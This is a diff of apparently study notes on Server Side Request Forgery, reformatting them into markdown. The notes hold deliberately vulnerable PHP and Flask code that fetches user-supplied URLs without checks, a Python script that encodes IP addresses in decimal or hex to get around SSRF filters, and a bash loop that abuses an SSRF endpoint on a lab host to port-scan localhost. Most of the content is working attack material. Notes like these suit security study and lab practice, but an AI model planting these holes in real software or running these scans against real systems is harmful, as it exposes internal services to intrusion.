@@ -1,10 +1,10 @@
-Server Side Request Forgery
-
+## Server Side Request Forgery
+https://portswigger.net/web-security/ssrf
 
 Cause no input sanitation 
 
 php example
-
+```php
 <?php
 
 if (isset($_GET['url']))
@@ -16,9 +16,11 @@ if (isset($_GET['url']))
   fpassthru($image);
 
 }
+?>
+```
 
 python example 
-
+```py
 from flask import Flask, request,  render_template, redirect
 import requests
 
@@ -34,20 +36,19 @@ def start():
 
 if __name__ == "__main__":
       app.run(host = '0.0.0.0')
-      
+```      
       
 Payloads
 
-
-
-
 python script to convert ip to D or H
 
-"""
+
 You can run this in the following format:
-For decimal: python3 ip2dh.py D <Ip-address>
-For Hexadecimal: python3 ip2dh.py H <Ip-address>
-"""
+For decimal:`python3 ip2dh.py D <Ip-address>`
+For Hexadecimal: `python3 ip2dh.py H <Ip-address>`
+
+
+```py
 #!/usr/bin/python3
 
 import sys
@@ -73,19 +74,19 @@ if Format == 'D':
 
 if Format == 'H':
    print('\nIP as Hexadecimal format: %s' % (hex(ip)))
-
+```
       
 bash script to scan ports
 
-
+```bash
 for x in {1..65535};
-    do cmd=$(curl -so /dev/null http://10.10.227.253:8000/attack?url=http://2130706433:${x} \
-        -w '%{size_download}');
-    if [ $cmd != 1045 ]; then
-        echo "Open port: $x"
-    fi
+  do cmd=$(curl -so /dev/null http://10.10.227.253:8000/attack?url=http://2130706433:${x} \
+	-w '%{size_download}');
+  if [ $cmd != 1045 ]; then
+	echo "Open port: $x"
+  fi
 done
 
-
+```
 
 
